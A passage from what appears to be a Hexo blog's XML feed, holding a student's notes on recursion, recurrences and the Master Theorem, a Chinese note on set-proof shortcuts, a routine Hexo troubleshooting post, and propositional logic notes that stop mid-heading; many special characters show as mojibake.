a(wv)$</p><p>Length of words:</p><p>(B) length(Î») = 0</p><p>(R) length(aw) = 1 + length(w)</p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p>Let $Î£$ be a finite set.<br>Define append : $Î£^âˆ— \times Î£ \to Î£^âˆ—$ by</p><script type="math/tex; mode=display">append(w, a) = wa</script><p>Give a (direct) definition of append [i.e. only concatenates symbols on the left].</p><p>For all $w âˆˆ Î£^âˆ—$ and $a,x âˆˆ Î£$:</p><p>(B) append(Î», x) = x</p><p>(R) append(aw, x) = a append(w, x)</p><h2 id="Pitfall-Correctness-of-Recursive-Definition"><a href="#Pitfall-Correctness-of-Recursive-Definition" class="headerlink" title="Pitfall: Correctness of Recursive Definition"></a>Pitfall: Correctness of Recursive Definition</h2><p>A recurrence formula is correct if the computation of any later term can be reduced to the initial values given in (B).</p><h3 id="Example-Incorrect-definition"><a href="#Example-Incorrect-definition" class="headerlink" title="Example (Incorrect definition)"></a>Example (Incorrect definition)</h3><p>Function g(n) is defined recursively by</p><script type="math/tex; mode=display">g(n) = g(g(n âˆ’1)âˆ’1)+1, \quad g(0) = 2.</script><p>The definition of $g(n)$ is <strong>incomplete</strong> â€” the recursion may <strong>not terminate</strong>:</p><p>Attempt to compute $g(1)$ gives</p><script type="math/tex; mode=display">g(1) = g(g(0)âˆ’1)+1 = g(1)+1 = ... = g(1)+1+1+1...</script><p>When implemented, it leads to an overflow; most static analyses cannot detect this kind of <strong>ill-defined recursion</strong>.</p><p>However, the definition could be repaired. For example, we can add the specification specify $g(1) = 2$.</p><p>Then </p><script type="math/tex; mode=display">g(2) = g(2âˆ’1)+1 = 3, \\g(3) = g(g(2) âˆ’1)+1 = g(3âˆ’1)+1 = 4, \\\dots</script><h3 id="Example-Incorrect-definition-1"><a href="#Example-Incorrect-definition-1" class="headerlink" title="Example (Incorrect definition)"></a>Example (Incorrect definition)</h3><p>Check your base cases!</p><p>Function f (n) is defined by</p><script type="math/tex; mode=display">f(n) = f(âŒˆn/2âŒ‰), f(0) = 1</script><p>When evaluated for n = 1 it leads to</p><script type="math/tex; mode=display">f (1) = f(1) = f(1) = ...</script><p>This one can also be repaired. For example, one could specify that<br>$f(1) = 1$.</p><p>This would lead to a constant function $f(n) = 1$ for all $n â‰¥ 0$.</p><h2 id="Mutual-Recursion"><a href="#Mutual-Recursion" class="headerlink" title="Mutual Recursion"></a>Mutual Recursion</h2><p>Sometimes recursive definitions use more than one function, with each calling each other.</p><h3 id="Example-Fibonacci-again"><a href="#Example-Fibonacci-again" class="headerlink" title="Example (Fibonacci, again)"></a>Example (Fibonacci, again)</h3><p>Recall:</p><script type="math/tex; mode=display">(B) f(0) = 0; \quad f(1) = 1, \\(R) f(n) = f(n âˆ’1)+f(nâˆ’2)</script><p>Alternative, mutually recursive definition:</p><script type="math/tex; mode=display">(B) f (1) = 1; g(1) = 0 \\(R) f (n) = f(n âˆ’1)+g(nâˆ’1) \\(R) g(n) = f(n âˆ’1)</script><script type="math/tex; mode=display">\left( \begin{matrix}f(n)\\g(n)\end{matrix} \right)=\left( \begin{matrix}1 & 1 \\1 & 0\end{matrix} \right)\left( \begin{matrix}f(n âˆ’1) \\g(n âˆ’1)\end{matrix} \right)</script><h1 id="Solving-Recurrences"><a href="#Solving-Recurrences" class="headerlink" title="Solving Recurrences"></a>Solving Recurrences</h1><p>Question: How can we (asymptotically) compare recursively defined functions?</p><p>Some practical approaches:</p><ul><li>Unwinding the recurrence</li><li>Approximating with big-O</li><li>The Master Theorem</li></ul><p>Take Notice</p><p>Each approach gives an informal â€œsolutionâ€: ideally one should prove a solution is correct (using e.g. induction).</p><h2 id="Example-1-Unwinding"><a href="#Example-1-Unwinding" class="headerlink" title="Example 1 (Unwinding)"></a>Example 1 (Unwinding)</h2><script type="math/tex; mode=display">f(0) = 1 \\f(n) = 2f(n âˆ’1)</script><p>Unwinding:</p><script type="math/tex; mode=display">f(n) = 2f(nâˆ’1) \\= 2(2f(nâˆ’2)) = 4f(nâˆ’2) \\= 4(2f(nâˆ’3)) = 8f(nâˆ’3) \\\vdots \quad \vdots\\= 2^if(nâˆ’i) \\\vdots \quad \vdots\\= 2^nf(0) = 2^n</script><h2 id="Example-2-unwinding"><a href="#Example-2-unwinding" class="headerlink" title="Example 2 (unwinding)"></a>Example 2 (unwinding)</h2><script type="math/tex; mode=display">f(1) = 0 \quad f(n) = 1 + f(\lfloor \frac{n}{2} \rfloor)</script><p>Unwinding:</p><script type="math/tex; mode=display">f(n) = 1+f(n/2) \\= 1+(1+f(n/4)) =2+f(n/4) \\= 2+(1+f(n/8)) \\\vdots \quad \vdots\\= i+f(n/2^i) \\\vdots \quad \vdots\\= log(n)+f(0) = log(n)</script><p>Take notice! The answer above may be wrong, because my proof is here:</p><p><img src="/2024/10/24/Math/Recursion/r_2.png" alt></p><h2 id="Example-3-Approximating-with-big-O"><a href="#Example-3-Approximating-with-big-O" class="headerlink" title="Example 3 (Approximating with big-O)"></a>Example 3 (Approximating with big-O)</h2><script type="math/tex; mode=display">f(1) = 1 \quad f(2) = 1 \quad f(n) =f(nâˆ’1)+f(nâˆ’2)</script><p>Note, the section is approximate big-O. If you want to unwind the fabonacci sequence, refer to <em>unwind-recursion-formula</em>.</p><p>Assuming $f(n)$ is increasing (The step is only to compare f(n)â€™s growth, to get its formula until a constant):</p><script type="math/tex; mode=display">f(n âˆ’2) â‰¤ f(nâˆ’1)</script><p>so</p><script type="math/tex; mode=display">f(n) â‰¤ 2f(n âˆ’1)</script><p>so (by unwinding):</p><script type="math/tex; mode=display">f(n) â‰¤ 2^n</script><p>so:</p><script type="math/tex; mode=display">f(n) âˆˆ O(2^n)</script><h2 id="Master-Theorem"><a href="#Master-Theorem" class="headerlink" title="Master Theorem"></a>Master Theorem</h2><p>The following result covers many recurrences that arise in practice (e.g. divide-and-conquer algorithms)</p><p>Let $a â‰¥ 1$ be an integer, $b &gt; 1$ a real number, and $T(n)$ be the following recurrence</p><script type="math/tex; mode=display">T(n) = a \cdot T(\frac{n}{b}) + f(n)</script><p>where $f(n) âˆˆ Î˜(n^c(log \text{ }n)^k)$.</p><p>By denoting $d = log_b(a)$, then we have:</p><ul><li><strong>Case 1</strong>: If $c &lt; d$ then $T(n) = Î˜(n^d)$</li><li><strong>Case 2</strong>: If $c = d$ then $T(n) = Î˜(n^c(logn)^{k+1})$</li><li><strong>Case 3</strong>: If $c &gt; d$ then $T(n) = Î˜(f(n))$</li></ul><p>Itâ€™s a little complicated to understand, please refer to <a href="https://en.wikipedia.org/wiki/Master_theorem_(analysis_of_algorithms">wiki: Master theorem</a>).</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1"></a>Example 1</h3><script type="math/tex; mode=display">T(n) = T(\frac{n}{2} ) + n^2, \quad T(1)=1</script><p>Here a = 1, b = 2, c = 2, k = 0 and d = 0. So we have Case 3 and the solution is</p><script type="math/tex; mode=display">T(n) = Î˜(n^c) = Î˜(n^2)</script><h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h3><p>Mergesort has</p><script type="math/tex; mode=display">T(n) = 2T(\frac{n}{2} ) + (n-1)</script><p>for the number of comparisons.</p><p>Here a = b = 2, c = 1, k = 0 and d = 1. So we have Case 2, and the solution is</p><script type="math/tex; mode=display">T(n) = Î˜(n^c log(n)) = Î˜(nlog(n))</script><h3 id="Example-3-wind"><a href="#Example-3-wind" class="headerlink" title="Example 3 wind"></a>Example 3 wind</h3><p>Unwinding example:</p><script type="math/tex; mode=display">T(1) = 0 \\ T(n) = 1+T(âŒŠ \frac{n}{2} âŒ‹)</script><p>Here a = 1, b = 2, c = 0, k = 0, and d = 0. So we have Case 2, and the solution is</p><script type="math/tex; mode=display">T(n) = Î˜(log(n))</script><h2 id="The-Master-Theorem-Pitfalls"><a href="#The-Master-Theorem-Pitfalls" class="headerlink" title="The Master Theorem: Pitfalls"></a>The Master Theorem: Pitfalls</h2><p>Take Notice</p><ul><li>a, b, c, k have to be constants (not dependent on n).</li><li>Only one recursive term.</li><li>Recursive term is of the form $T(n/b)$, not $T(n âˆ’ b)$.</li><li>Solution is only an asymptotic bound.</li></ul><p>Examples</p><p>The Master theorem does not apply to any of these:</p><script type="math/tex; mode=display">T(n) =2^nT(n/2)+n^2 \\T(n) =T(n/5)+T(7n/10)+n \\T(n) =2T(nâˆ’1)</script><p>First equation, the a $(2^n)$ is related to n; Second there are two T terms; Third the item is n-1 rather not n/?.</p><h2 id="The-Master-Theorem-Linear-differences"><a href="#The-Master-Theorem-Linear-differences" class="headerlink" title="The Master Theorem: Linear differences"></a>The Master Theorem: Linear differences</h2><p>Take Notice</p><p>The Master Theorem applies to recurrences where T(n) is defined in terms of T(n/b); not in terms of T(n âˆ’1).</p><p>However, the following is a consequence of the Master Theorem:</p><p>Theorem</p><p>Suppose</p><script type="math/tex; mode=display">T(n) = aÂ·T(nâˆ’1) + bn^k</script><p>Then</p><script type="math/tex; mode=display">T(n)\begin{cases}    O(n^{k+1}) \quad if a=1 \\    O(a^n) \quad if a>1 \end{cases}</script><h3 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h3><p>Solve $T(n) = 3^nT(\frac{n}{2})$ with $T(1) = 1$</p><p>Let $n â‰¥ 2$ be a power of 2 then</p><script type="math/tex; mode=display">T(n) = 3^n Â·3^{\frac{n}{2}}Â·3^{\frac{n}{4}}Â·3^{\frac{n}{8}} \cdot \dots = 3^{1+\frac{1}{2}+\frac{1}{4}+\frac{1}{8}+\dots} = O(3^{2n})</script>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é›†åˆé¢˜é€Ÿåš</title>
      <link href="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/"/>
      <url>/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/</url>
      
        <content type="html"><![CDATA[<p>æ¯”å¦‚ï¼ŒAâˆ©Bä¸ç­‰äºç©ºé›†ï¼Œç›´æ¥æ¨å‡º<strong>Aå’ŒBéƒ½ä¸æ˜¯ç©ºé›†</strong>ï¼Œå› æ­¤<strong>å†å‡è®¾ å­˜åœ¨xå±äºA å±äºB</strong>è¿™ç§çš„</p><p>å¦‚æœæ˜¯<strong>è¶…é›†ï¼Œé‚£è¿™ä¸ªé›†åˆè‚¯å®šä¸æ˜¯ç©ºé›†</strong></p><p>å¦‚æœæœ‰<strong>å­é›†ï¼Œé‚£å¯èƒ½æ˜¯ç©ºé›†</strong>ï¼Œå¯ä»¥ç›´æ¥letè¿™ä¸ªé›†åˆæ˜¯$\empty$</p><p>è¿™æ ·<strong>å¦‚æœé¢˜æ˜¯å¯¹çš„</strong>ï¼Œç›´æ¥æ­£å‘è¯æ˜ï¼›<strong>å¦‚æœæ˜¯åä¾‹</strong>ï¼Œå°±ç›´æ¥Counter example</p><p>çœ‹é¢˜ç›®ï¼š</p><p><img src="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/S_Q.png" alt></p><p>æ¯”å¦‚æˆ‘ä¸‹é¢ç¬¬ä¸€ä¸ªå›¾çš„è§£æ³•ä¸ä¸¥è°¨ï¼šå¾—å…ˆè¯æ˜é›†åˆéƒ½ä¸æ˜¯ç©ºé›†ï¼Œæ‰èƒ½å‡è®¾æœ‰å…ƒç´ xã€‚</p><p><img src="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/S11.jpg" alt></p><p>ä¸‹å›¾è§£æ³•ä¸¥è°¨æ­£ç¡®ã€‚</p><p><img src="/2024/10/17/Math/%E9%9B%86%E5%90%88%E9%A2%98%E9%80%9F%E5%81%9A/S12.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>3-hexo error solution</title>
      <link href="/2024/10/16/trivia/3-hexo-error-solution/"/>
      <url>/2024/10/16/trivia/3-hexo-error-solution/</url>
      
        <content type="html"><![CDATA[<p>3-hexoåšå®¢ç³»ç»Ÿæœ€è¿‘è€æ˜¯å‡ºé—®é¢˜ï¼Œæˆ‘é˜è¿°ä¸‹åšå®¢å¦‚ä½•å¤‡ä»½ã€å¸¸è§é—®é¢˜è§£å†³ã€‚</p><h1 id="å¤‡ä»½"><a href="#å¤‡ä»½" class="headerlink" title="å¤‡ä»½"></a>å¤‡ä»½</h1><p>hexoåªè´Ÿè´£ç”Ÿæˆå‰ç«¯é¡µé¢ï¼Œç„¶å<code>hexo d</code>å‘½ä»¤ç›´æ¥æ¨åˆ°ä½ çš„github ä»“åº“ç„¶åéƒ¨ç½²åˆ° git pageä¸Šï¼Œå› æ­¤éœ€è¦æ³¨æ„hexo då‘½ä»¤å¹¶ä¸ä¼šæŠŠä½ çš„mdçš„åšå®¢æºæ–‡ä»¶å¤‡ä»½ã€‚ä½ å¦‚æœä¸å°å¿ƒåˆ é™¤äº†è‡ªå·±çš„mdæºæ–‡ä»¶ï¼Œå¿…é¡»è‡ªå·±æƒ³åŠæ³•æŠ„è‡ªå·±git pageæŠ„å›æ¥æ‰è¡Œã€‚</p><p>å¦‚æœè¦å¤‡ä»½ï¼Œå‚è€ƒä¸‹3-hexoåŸä½œè€…æ–‡ç« ï¼Œå·²ç»ç›´æ¥æåˆ°äº†å»ºè®®è‡ªè¡Œ git init å¯¹åšå®¢æºæ–‡ä»¶è¿›è¡Œå¤‡ä»½ã€‚</p><p><a href="https://yelog.org/2017/03/23/3-hexo-instruction/">https://yelog.org/2017/03/23/3-hexo-instruction/</a></p><p>å‚è€ƒ <strong>6.3 åšå®¢å¤‡ä»½ï¼ˆå¿«æ·å‘½ä»¤å‡çº§ç‰ˆï¼‰</strong> ä¸€ç« ã€‚</p><p>å¦å¤–è®°å¾—æŠŠ<code>\themes\3-hexo</code>ç›®å½•ä¸‹çš„<code>.git</code>ç›®å½•ç›´æ¥åˆ é™¤ã€‚</p><p>å› ä¸ºä½ å·²ç»é…ç½®äº†ä¸€äº›ä¸œè¥¿åœ¨è¿™ä¸ªç›®å½•ä¸‹çš„<code>.config.yml</code>ï¼Œæ‰€ä»¥ä¸è¦æŠŠè¿™ä¸ªä¸œè¥¿å½“submoduleæˆ–è€…ä»€ä¹ˆä¸å€¼å¾—ä¸Šä¼ çš„ç›®å½•ã€‚å› ä¸ºæˆ‘ä»¬é…ç½®å¾ˆéº»çƒ¦ï¼Œå¹²è„†å¤‡ä»½ç›´æ¥æŠŠé…ç½®æ–‡ä»¶ã€å›¾ç‰‡ã€åšå®¢mdå…¨éƒ½ä¸Šä¼ åˆ°githubï¼Œè¿™æ ·æœ€æ–¹ä¾¿å’Œå½»åº•ã€‚</p><h1 id="å¸¸è§é—®é¢˜-childProcess"><a href="#å¸¸è§é—®é¢˜-childProcess" class="headerlink" title="å¸¸è§é—®é¢˜ childProcess"></a>å¸¸è§é—®é¢˜ childProcess</h1><p>å¸¸è§äºhexoè‡ªå·±å¤„ç†çš„<code>.deploy_git</code>çš„ä¸€äº›git indexå‡ºç°äº†é”™è¯¯ï¼Œæˆ–è€…npmçš„åº“æ–‡ä»¶å‡ºä»€ä¹ˆå¹ºè›¾å­ã€‚</p><p>è¿™ä¸ªé—®é¢˜è§£å†³åŠæ³•ï¼ˆ90%çš„åŠæ³•ï¼‰ï¼š</p><p>ç›´æ¥åˆ é™¤ <code>node_modules</code> ç›®å½•ï¼Œç„¶å <code>npm i</code> å‘½ä»¤é‡æ–°ä¸‹è½½è¿™ä¸ª <code>node_modules</code></p><p>ç„¶ååˆ é™¤<code>.deploy_git</code>ï¼Œè‡ªå·±ç”¨<code>hexo d</code>é‡æ–°ç”Ÿæˆã€‚</p><p>æœ€åè®°å¾—æŠŠ<code>.deploy_git</code>åŠ å…¥<code>.gitignore</code>ã€‚</p><pre><code>.DS_StoreThumbs.dbdb.json*.lognode_modules/public/.deploy*/_multiconfig.yml.deploy_git</code></pre>]]></content>
      
      
      <categories>
          
          <category> trivia </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Propositional Logic</title>
      <link href="/2024/10/15/Math/Propositional-Logic/"/>
      <url>/2024/10/15/Math/Propositional-Logic/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#propositional-logic-informally">Propositional Logic, informally</a><ul><li><a href="#examples">Examples</a></li><li><a href="#logical-connectives">Logical connectives</a><ul><li><a href="#examples-1">Examples</a></li></ul></li><li><a href="#logical-connectives-1">Logical connectives</a></li><li><a href="#compound-propositions">Compound propositions</a><ul><li><a href="#example">example</a></li></ul></li><li><a href="#vacuous-truth">Vacuous truth</a><ul><li><a href="#exercises">Exercises</a></li></ul></li><li><a href="#tautologies-contradictions-and-contingencies">Tautologies, Contradictions and Contingencies</a><ul><li><a href="#definition">Definition</a></li><li><a href="#example-1">Example</a></li></ul></li><li><a href="#applications-i-constraint-satisfaction-problems">Applications I: Constraint Satisfaction Problems</a><ul><li><a href="#example-2">Example</a></li><li><a href="#exercise">Exercise</a></li></ul></li><li><a href="#logical-equivalence">Logical equivalence</a></li><li><a href="#applications-ii-program-logic">Applications II: Program Logic</a></li><li><a href="#entailment-and-validity">Entailment and Validity</a><ul><li><a href="#example-of-toyota-and-ford">Example of Toyota and Ford</a></li><li><a href="#example-of-spaceship-and-the-imposters">Example of spaceship and the imposters</a></li></ul></li><li><a href="#applications-iii-reasoning-about-requirementsspecifications">Applications III: Reasoning About Requirements/Specifications</a><ul><li><a href="#example-of-alarm-ringing">Example of alarm ringing</a></li></ul></li></ul></li><li><a href="#propositional-logic-formally">Propositional Logic, formally</a><ul><li><a href="#syntax-vs-semantics">Syntax vs Semantics</a><ul><li><a href="#example-3">example</a></li></ul></li><li><a href="#syntax-well-formed-formulas">Syntax: Well-formed formulas</a><ul><li><a href="#examples-2">Examples</a></li></ul></li><li><a href="#syntax-conventions">Syntax: Conventions</a></li><li><a href="#syntax-parse-trees">Syntax: Parse trees</a></li><li><a href="#syntax-parse-trees-formally">Syntax: Parse trees formally</a></li><li><a href="#semantics-boolean-algebras">Semantics: Boolean Algebras</a></li><li><a href="#semantics-truth-valuations">Semantics: Truth valuations</a></li><li><a href="#semantics-exercises">Semantics: Exercises</a></li><li><a href="#semantics-truth-tables">Semantics: Truth tables</a></li><li><a href="#satisfiability-and-equivalence">Satisfiability and Equivalence</a></li><li><a href="#example-party-invitations">Example: Party invitations</a></li><li><a href="#logical-equivalence-1">Logical equivalence</a><ul><li><a href="#properties">properties</a></li><li><a href="#exercise-1">exercise</a></li></ul></li><li><a href="#theories-and-entailment">Theories and entailment</a></li><li><a href="#entailment-and-implication">Entailment and Implication</a></li><li><a href="#showing-entailment">Showing entailment</a><ul><li><a href="#entailment-example">Entailment example</a></li><li><a href="#examplecrewmates-and-imposters">Example:Crewmates and Imposters</a></li></ul></li></ul></li><li><a href="#cnf-and-dnf-revisited">CNF and DNF Revisited</a></li><li><a href="#beyond-propositional-logic">Beyond Propositional Logic</a><ul><li><a href="#limitations-to-propositional-logic">Limitations to Propositional Logic</a></li><li><a href="#beyond-propositional-logic-1">Beyond Propositional Logic</a></li><li><a href="#limitations">Limitations</a></li></ul></li></ul><h1 id="Propositional-Logic-informally"><a href="#Propositional-Logic-informally" class="headerlink" title="Propositional Logic, informally"></a>Propositional Logic, informally</h1><p>A <strong>proposition</strong> (or sentence) is a declarative statement; something that is either <strong>true</strong> or <strong>false</strong>.</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><ul><li>Richard Nixon was president of Ecuador.</li><li>A square root of 16 is 4.</li><li>Euclidâ€™s program gets stuck in an infinite loop if you input 0.</li><li>$x^n +y^n =z^n$ has no nontrivial integer solutions for n &gt; 2.</li><li>3 divides 24.</li><li>K_5 is planar.</li></ul><p>The following are <strong>not</strong> declarative sentences:</p><ul><li>Gubble gimble goo</li><li>For Peteâ€™s sake, take out the garbage!</li><li>Did you watch MediaWatch last week?</li><li>Please waive the prerequisites for this subject for me.</li><li>x divides y.  â€” R(x,y)</li><li>x =3 and x divides 24.  â€” P(x)</li></ul><h2 id="Logical-connectives"><a href="#Logical-connectives" class="headerlink" title="Logical connectives"></a>Logical connectives</h2><p><strong>Logical connectives</strong> join together propositions to build larger, <strong>compound</strong> propositions.</p><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><ul><li>Chef is a bit of a Romeo <strong>and</strong> Kenny is always getting killed.</li><li>Either Bill is a liar <strong>or</strong> Hillary is innocent of Whitewater.</li><li>It is <strong>not</strong> the case that this program always halts.</li><li><strong>If</strong> it is raining <strong>then</strong> I have an umbrella.</li></ul><h2 id="Logical-connectives-1"><a href="#Logical-connectives-1" class="headerlink" title="Logical connectives"></a>Logical connectives</h2><p>Common logical connectives:</p><div class="table-container"><table><thead><tr><th>Symbol</th><th>Default</th><th>Also known as</th></tr></thead><tbody><tr><td>âˆ§</td><td>and</td><td>but,â€œ;â€</td></tr><tr><td>âˆ¨</td><td>or</td><td>â€œeither .. or ..â€</td></tr><tr><td>Â¬</td><td>not</td><td>not the case</td></tr><tr><td>â†’</td><td>â€œif .. then..â€</td><td><strong>implies</strong>, whenever, is sufficient for</td></tr><tr><td>â†”</td><td>â€œ.. ifandonlyif ..â€</td><td><strong>bi-implies</strong>, necessary and sufficient, exactly when, just in case</td></tr></tbody></table></div><h2 id="Compound-propositions"><a href="#Compound-propositions" class="headerlink" title="Compound propositions"></a>Compound propositions</h2><p>The <strong>truth</strong> of a compound proposition depends on the truth of its components (<strong>atomic propositions</strong>):</p><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>P: Chef is a bit of a Romeo <strong>and</strong> Kenny is always getting killed.</p><div class="table-container"><table><thead><tr><th>Chef is a bit of a Romeo</th><th>Kenny is always getting killed</th><th>P</th></tr></thead><tbody><tr><td>True</td><td>True</td><td>True</td></tr><tr><td>False</td><td>True</td><td>False</td></tr><tr><td>True</td><td>False</td><td>False</td></tr><tr><td>False</td><td>False</td><td>False</td></tr></tbody></table></div><hr><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-09-55-00.png" alt></p><h2 id="Vacuous-truth"><a href="#Vacuous-truth" class="headerlink" title="Vacuous truth"></a>Vacuous truth</h2><p>Interesting! I thought the topic in my former article <a href="https://senranja.github.io/2024/09/27/Math/vacuous-truth/">ç”±ç©ºé›†å’Œå­é›†ï¼Œæƒ³åˆ°ç©ºæ´çœŸç†</a>.</p><p>How to interpret A â†’ B when A is false?</p><p>Aâ†’B If A(premise) then B (conclusion)</p><p>Material implication is false <strong>only when</strong> the premise holds and the conclusion does not.</p><p>If the premise is false, the implication is true no matter how absurd the conclusion is.</p><p>Both the following statements are true:</p><ul><li>If February has 30 days then March has 31 days.</li><li>If February has 30 days then March has 42 days.</li></ul><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>p = â€œyouget an HD on your final examâ€</p><p>q = â€œyoudoevery exercise in the bookâ€</p><p>r = â€œyou get an HD in the courseâ€</p><p>Translate into logical notation:</p><p>(a) You get an HD in the course although you do not do every exercise in the book.</p><p>râˆ§Â¬q</p><p>(c) To get an HD in the course, you must get an HD on the exam.</p><p>râ†’p</p><p>(d) Youget an HDonyour exam, but you donâ€™t do every exercise in this book; nevertheless, you get an HD in this course.</p><p>pâˆ§Â¬qâˆ§r</p><h2 id="Tautologies-Contradictions-and-Contingencies"><a href="#Tautologies-Contradictions-and-Contingencies" class="headerlink" title="Tautologies, Contradictions and Contingencies"></a>Tautologies, Contradictions and Contingencies</h2><p>åŒä¹‰åå¤ã€çŸ›ç›¾å’Œå¶ç„¶æ€§</p><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>A proposition is:</p><ul><li>a tautology if it is always true,</li><li>a contradiction if it is always false,</li><li>a contingency if it is neither a tautology or a contradiction,</li><li>satisfiable if it is not a contradiction.</li></ul><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><ul><li>Contingency: It is raining</li><li>Tautology: It is raining or it is not raining</li><li>Contradiction: It is raining and it is not raining</li></ul><h2 id="Applications-I-Constraint-Satisfaction-Problems"><a href="#Applications-I-Constraint-Satisfaction-Problems" class="headerlink" title="Applications I: Constraint Satisfaction Problems"></a>Applications I: Constraint Satisfaction Problems</h2><p>These are problems such as timetabling, activity planning, etc.</p><p>Many can be understood as showing that a formula is satisfiable.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p>You are planning a party, but your friends are a bit touchy about who will be there.</p><ol><li><p>Sarah hates Johnâ€™s jokes. She will not come to the party if John is invited.</p></li><li><p>Kim loves Johnâ€™s jokes, and says she will not come unless John does.</p></li><li><p>Sarah is shy, and will only come to the party if her best friend Kim will be there.</p></li></ol><p>Who can you invite without making someone unhappy?</p><p>Translation to logic: let J,S,K represent â€œJohn (Sarah, Kim) comes to the partyâ€. Then the constraints are:</p><ol><li>J â†’Â¬S</li><li>K â†’J</li><li>S â†’K</li></ol><p>Thus, for a successful party to be possible, we want the formula $Ï† =(J â†’Â¬S)âˆ§(S â†’K)âˆ§(K â†’J)$ to be satisfiable. Truth values for J,S,K making this true are called <strong>satisfying</strong> <strong>assignments</strong>, or <strong>models</strong>.</p><p>We can use logical reasoning to work out what options are available:</p><ul><li><p>If Kim comes, then John must, and Sarah must not.</p></li><li><p>If Kim doesnâ€™t come, then Sarah cannot come. John may or may not come.</p></li></ul><p>Conclusion: a party satisfying the constraints can be held. Invite nobody, or invite John only, or invite Kim and John.</p><h3 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h3><p><img src="/2024/10/15/Math/Propositional-Logic/JT1.png" alt></p><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-16-12-59-07.png" alt></p><h2 id="Logical-equivalence"><a href="#Logical-equivalence" class="headerlink" title="Logical equivalence"></a>Logical equivalence</h2><p>Definition</p><p>Two propositions are <strong>logically equivalent</strong> if they are true for the same truth values of their atomic propositions.</p><p>Example</p><p>A : â€œIt is rainingâ€</p><p>is logically equivalent to</p><p>Â¬(Â¬A) : â€œIt is not the case that it is not rainingâ€</p><div class="table-container"><table><thead><tr><th>A</th><th>Â¬A</th><th>Â¬(Â¬A)</th></tr></thead><tbody><tr><td>True</td><td>False</td><td>True</td></tr><tr><td>False</td><td>True</td><td>False</td></tr></tbody></table></div><h2 id="Applications-II-Program-Logic"><a href="#Applications-II-Program-Logic" class="headerlink" title="Applications II: Program Logic"></a>Applications II: Program Logic</h2><p>Example</p><p>if $x &gt;0$ or $(x &lt;=0 and y &gt;100)$:</p><script type="math/tex; mode=display">Let \quad p \overset{def}{=} ( x >0) \quad and \quad q \overset{def}{=} (y > 100)</script><script type="math/tex; mode=display">p âˆ¨ (Â¬pâˆ§q)</script><p><img src="/2024/10/15/Math/Propositional-Logic/2024-10-15-10-36-58.png" alt></p><p>$p âˆ¨(Â¬p âˆ§q)$ is equivalent to $p âˆ¨q$.</p><p>Hence the code can be simplified to</p><script type="math/tex; mode=display">if x >0 \quad or \quad y >100:</script><h2 id="Entailment-and-Validity"><a href="#Entailment-and-Validity" class="headerlink" title="Entailment and Validity"></a>Entailment and Validity</h2><p>è•´æ¶µå’Œæœ‰æ•ˆæ€§</p><p>An <strong>argument</strong> consists of a set of propositions called <strong>premises</strong> and a declarative sentence called the <strong>conclusion</strong>.</p><h3 id="Example-of-Toyota-and-Ford"><a href="#Example-of-Toyota-and-Ford" class="headerlink" title="Example of Toyota and Ford"></a>Example of Toyota and Ford</h3><p><strong>Premises</strong>:</p><ul><li><p>Frank took the Ford or the Toyota.</p></li><li><p>If Frank took the Ford he will be late.</p></li><li><p>Frank is not late.</p></li></ul><p><img src="/2024/10/15/Math/Propositional-Logic/Toyota.png" alt></p><p><strong>Conclusion</strong>:</p><p>Frank took the Toyota</p><hr><p>An argument is <strong>valid</strong> <strong>if the conclusions are true whenever all the premises are true</strong>. Thus: if we believe the premises, we should also believe the conclusion.</p><p>(Note: we donâ€™t care what happens when one of the premises is false.)</p><p>Other ways of saying the same thing:</p><ul><li>The conclusion logically follows from the premises.</li><li>The conclusion is a logical consequence of the premises.</li><li>The premises <strong>entail</strong> the conclusion.</li></ul><hr><p>The <strong>argument</strong> <strong>above</strong> is <strong>valid</strong>. The following is <strong>invalid</strong>:</p><p>Premises</p><ul><li>Frank took the Ford or the Toyota.</li><li>If Frank took the Ford he will be late.</li><li>Frank is late.</li></ul><p>Conclusion</p><p>Frank took the Ford.</p><hr><p>The argument above is invalid, please refer to the pic I draw, and the reasoning is that, we cannot judge Frank took the Ford, because he could take the Toyota and hence he was late!</p><hr><h3 id="Example-of-spaceship-and-the-imposters"><a href="#Example-of-spaceship-and-the-imposters" class="headerlink" title="Example of spaceship and the imposters"></a>Example of spaceship and the imposters</h3><p>You are on a spaceship with <strong>crewmates</strong> â€“ who always tell the truth; and <strong>imposters</strong>â€“ who always lie.</p><p>Premises:</p><p>Red says: â€œBlue is an imposterâ€</p><p>Green says: â€œRed and Blue are both crewmatesâ€</p><p>Blue says: â€œRed is a crewmate, or Green is an imposterâ€</p><p>Everyone is either a crewmate, or an imposter, but not both</p><p>-&gt; Conclusion: Green is an imposter.</p><hr><p>Jiaojiao: â€œLater we use propositional logic to prove itâ€</p><hr><h2 id="Applications-III-Reasoning-About-Requirements-Specifications"><a href="#Applications-III-Reasoning-About-Requirements-Specifications" class="headerlink" title="Applications III: Reasoning About Requirements/Specifications"></a>Applications III: Reasoning About 